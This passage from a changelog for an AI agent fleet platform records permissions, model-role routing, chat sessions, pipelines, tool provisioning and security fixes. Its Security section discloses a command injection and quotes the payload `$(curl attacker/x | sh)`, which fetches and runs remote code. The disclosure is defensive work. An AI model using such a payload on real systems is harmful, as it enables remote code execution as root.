  single bot is hidden from someone who can otherwise see their whole department.
- **Watching a desktop and driving it are separate permissions**, and the
  distinction is enforced by which VNC server the connection is spliced to, not by
  a flag the client could ignore.
- **Listings are filtered, not gated.** Someone who may see two bots of twenty
  gets two. Returning all of them and hiding the rest in the client would put
  every department's bot names on the wire.
- `GET /api/me/permissions` reports a caller's effective permissions, so clients
  do not each re-derive them and disagree.
- Permission checks were then added to the routes the first pass missed, and the
  last three ungated routes were found by enumerating the router rather than
  reading it — which is the only way that ends.
- All of this is administrable from the phone app as well as the console.

### Model combinations

The philosophy document had described splitting perception from reasoning; an
audit found nothing implemented it. Every call site used the same chain, so one
model read the screen, planned, chatted and summarised.

- **Roles are real**: `vision`, `reasoning`, `chat`, `summarize`, `refine`. Each
  call site now asks for the role it is actually playing.
- **A combination** assigns models to roles. The simple form is a brain and a pair
  of hands — the split that matters most, since reading a screen and reasoning
  about it reward completely different models. The advanced form exposes every
  role, for when summarising a long thread should not cost what planning does.
- **Combinations sit in the same fallback chain as single providers**, which is
  what makes "this pair, and if neither answers, that one" expressible as one
  ordered list.
- **Vision never falls back to a role chosen for text.** A text-only model
  assigned to the hands is refused at save time with the reason, rather than
  being skipped every turn and appearing to do nothing.
- `GET /api/instances/{id}/models/resolved` shows which model would actually
  serve each role for a given bot.

### Model connections and signing in

- Manage AI connections from inside the app, with per-bot fallback chains.
- **Sign in with an account instead of pasting an API key**: OAuth 2.0
  authorization code with PKCE, where the app opens the provider's own consent
  page and the server does the exchange. The app never holds a client secret, a
  code or a token.
- A signed-in connection stores its credential under a different vault reference
  from its API key, so switching between the two does not destroy the one you are
  not currently using.
- Dropped the Vertex AI path added earlier in the cycle. It required a Google
  Cloud project rather than a subscription, which was not what it appeared to
  offer.
- The provider form now says which authentication method to pick, and offers the
  easier one first.
- Model discovery no longer strands a connection on every rejected key.
- Reasoning models no longer fail the Ollama health probe by spending their
  budget on a hidden thinking pass and returning nothing.

### Conversations, chat sessions and sender identity

- **Conversations are objects** you create and delete, rather than threads
  inferred from who happened to message whom. Direct with one bot, a pair of bots
  you watch, or a group. An unfiled message from an agent that knows nothing
  about conversations is placed by its recipient, so agent-to-agent chatter lands
  in its own thread rather than the fleet channel.
- **Threads can be compacted**: a long history folds into one summary message
  through the `summarize` role. The originals stay in the database and stop being
  replayed. A failed or empty summary leaves the thread untouched, because losing
  history to a model call is the one outcome compaction must never have.
- **Per-bot named chat sessions**, which can be started, renamed, pinned and
  deleted. Each is its own context: the history replayed into the model is scoped
  to the open chat, so a chat you deliberately started clean stays clean. Messages
  from before the migration keep a null session and appear as "Earlier chat".
- **Agents know who is speaking.** Every human turn used to arrive with no
  attribution, so an agent could not tell one colleague from another or notice
  that whoever is asking now is not who set the task. Chat and peer messages now
  carry their sender.
- **Memories can be about a person**, attributed to them rather than to the world,
  and returned only when that person next talks to that bot. What one agent
  learned about a colleague is not every agent's to know. The prompt tells the
  agent not to recite them, and not to guess at people — only to record what it
  was told or plainly shown.
- **Per-bot memory namespaces.** One shared pool meant every agent recalled every
  other agent's notes, so a finding about one machine came back as guidance to an
  unrelated bot mid-task. What a bot has kept is now visible in the app and can be
  forgotten one entry at a time.
- Agents stopped answering old messages, summaries, and rooms they are not in.
- Several chats with the same people no longer rename each other, and the
  broadcast channel can be renamed and pinned like any other.
- A bot can propose a plan and wait for approval instead of acting immediately.

### Pipelines and triggers

- **DAG pipelines that actually run.** Running a real three-bot pipeline turned up
  four faults, each of which made the feature look like it worked. Execution
  walked the node list in declaration order and ignored the edges, so what was
  stored as a graph ran as a list. Nothing ran at all: each node slept 500ms and
  recorded a fixed success string, so a run could not fail. Nothing was validated,
  so a graph with a cycle or an edge pointing at a node that does not exist was
  accepted with a 200. And a run did not survive a restart.

  Nodes are now topologically ordered, dispatched through the same trigger
  dispatcher that webhooks and cron use, and a failing node fails the pipeline
  rather than handing the next node a dependency that never produced anything.
  Invalid graphs are refused at save with the reason, because a pipeline is
  written once and run on a schedule.

  Note what is still not implemented: nodes run **one at a time**, and edge
  conditions are stored but not evaluated. The UI used to promise otherwise; that
  copy has been corrected.
- **Real webhook dispatch and a cron scheduler**, both persisted and reloaded at
  start, with a guarded claim so a trigger cannot double-fire. Cron expressions
  that will not parse are rejected when created rather than silently never firing.
- A task waiting on a human can now be cancelled. Previously it could not be
  cancelled at all, ever, and sat in `awaiting_human` with nothing able to move
  it.

### Tools and archetypes

- **Choose which of an archetype's tools to install, and add your own.** An
  archetype's tool list used to be all-or-nothing and fixed. A custom tool carries
  how to fetch it: apt, pip, npm, `go install`, a downloaded binary, or a
  repository cloned into the workspace. Operator recipes are consulted before the
  built-in file, so an addition behaves exactly like a built-in one and can
  override it.
- Names and specifications are validated against an allowlist before anything is
  provisioned, because these values reach a shell inside the sandbox. Refusing at
  the door beats sanitising deep in a script.
- **Archetypes install what their templates promise, and claim only what landed.**
  The templates declare tools aspirationally; the orchestrator now reconciles the
  agent's prompt against what actually installed, so a model is not told it has
  Ghidra when it does not.
- A tool with no recipe no longer abandons the whole initialiser, leaving every
  later tool uninstalled.

### Perception

- **Support for vision models that answer in normalised coordinates**, and then
  **automatic calibration of each model's convention.** There is no way to ask a
  model which convention it uses, and prompting does not change it — measured
  against one model, the reply was byte-identical whether the prompt said nothing,
  stated the pixel range, or included a worked example. The agent now shows the
  model one frame whose layout it cannot know in advance, reads the convention off
  the answer, and caches it.
- Set-of-Marks was calling an accessibility function that has never existed.

### Desktop, voice and the phone app

- **Real speech from a CPU sidecar**, with a voice per agent and a picker in the
  app.
- **Takeover on Linux and Windows**, first through the system browser and then
  embedded in the page with CEF. Depending on the system browser proved fragile:
  on one machine the default handler pointed at a browser sitting behind an
  unaccepted first-run dialog, so takeover opened nothing and explained nothing.
- noVNC's own assets are now served through the proxy, so the viewer loads inside
  the app rather than showing a blank frame.
- Real full-screen, and no double title bar.
- The phone app gained provisioning, host usage, agent-to-agent messaging, a DAG
  view, and its own icon, splash and name. The Voice and Swarm tabs were dropped.
- Idle agents answer messages instead of ignoring them until given a task.

### Security

- **Command injection through `preinstalled_tools` (critical).** Provisioning
  verified a bot's toolchain by writing each tool name into a bash script with
  Go's `%q`, which produces a *double*-quoted string — and bash expands `$(...)`
  and backticks inside double quotes. A tool name of `$(curl attacker/x | sh)` in
  a create-instance request ran as root inside the sandbox. Reachable by any
  operator permitted to create a bot in one organisation, which under the new
  RBAC can be an ordinary member. Confirmed by exploit against a running server.
  Now single-quoted, with the awkward case — the quote character itself — closed
  and reopened around an escape. The tests run the real shell rather than
  asserting on the quoted string, because the claim being made is about what bash
  does with it.

- **A build that hid the fix.** Worth recording separately. Upgrading
  dependencies raised `go.mod` to Go 1.25 while the Dockerfile still built on
  1.23, so every image build had been failing at `go mod download` — and Compose
  carried on running the previous image while the deploy printed "Started". Four
  deploys reported success and shipped nothing. The build image is bumped, and
  the deployed binary was checked for the fix rather than assumed.

- **A fatal concurrent-map crash that could kill the orchestrator.** A pipeline
  run carries its node results in a map, and both the trigger and list paths
  handed the struct out by value — sharing that map with the goroutine still
  executing the pipeline. The API then serialised it while a node wrote to it. A
  concurrent map access is a fatal runtime error, not a recoverable one, so
  refreshing the pipelines screen during a run could take the whole orchestrator
  down. Runs now leave the engine as snapshots.

- **Three dependency vulnerabilities, `govulncheck` from three reachable to
  none.** pgx 5.7.1 to 5.9.2, which carried a SQL injection through placeholder
  confusion with dollar-quoted literals, plus `golang-jwt` and `x/text`.

- **The set-role route stored any string as a role.** Creating a user validated
  the role; changing one did not. An unrecognised role ranks below every gate, so
  writing one locked the account out of the entire API — and the request answered
  204, so it read as success. Aiming the same call at a user ID that does not
  exist also answered 204, because an UPDATE matching no rows is not an error to
  the driver. *(Found and fixed during the audit pass. The validation change
  landed inside commit `7abc2c0`, whose stated purpose was a comms UI change;
  `0edf888` added the tests and the missing-user case.)*

- **`ExecAs` did not check the Docker exec-start status.** The engine's own error
  body was demultiplexed and returned as though it were the command's stdout,
  with a nil error, so a caller probing a paused container was told the probe had
  run and printed something. *(Also from the audit pass, and also landed inside
  commit `7abc2c0` rather than in a commit of its own.)*

### Sandbox

- Snapshots archived a directory the agent never uses.
- The keyring's 204 replies put a body on the wire.
- Sudo can be changed on a running instance rather than requiring the container
  to be recreated. This is a deliberate trade: `no-new-privileges` is the stronger
  control but the kernel fixes it at container creation, which meant revoking sudo
  meant destroying the agent's workspace — at exactly the moment that costs most.
  Sudo is gated by the setuid bit on `/usr/bin/sudo` instead. What is lost is the
  kernel-level backstop against a bug in sudo or another setuid binary. See
  [docs/SECURITY.md](docs/SECURITY.md).

### Reliability in the app

- The vault screen hid its own spinner and errors behind stale state.
- Recording controls could call `setState` on a disposed screen.
- Deleting a shared secret sent no credentials and reported success anyway.
- The invisible-error bug was found in three more sheets.
- The API returns empty arrays rather than null, and reports the socket as
  connected when it is.

### Documentation

The documentation was rewritten against the code for this release; several
documents had described things that were never built. See
[docs/RELEASE_NOTES_v1.1.0.md](docs/RELEASE_NOTES_v1.1.0.md) and the README's
"What is partly built" section.

---

## [internal milestone 1.0.0] — 2026-08-28

The first end-to-end working tree. Sandboxed Linux desktops on Docker with cgroup limits and
nftables egress policy; a perceive-decide-act agent loop over a fallback chain of
model providers; teaching by demonstration compiled into `SKILL.md`; escalation
to a human on a stalled screen; an AES-256-GCM credential vault; a React admin
console and a Flutter companion app.

[1.0.0]: https://github.com/BryantVanOrden/AgentFleet/releases/tag/v1.0.0
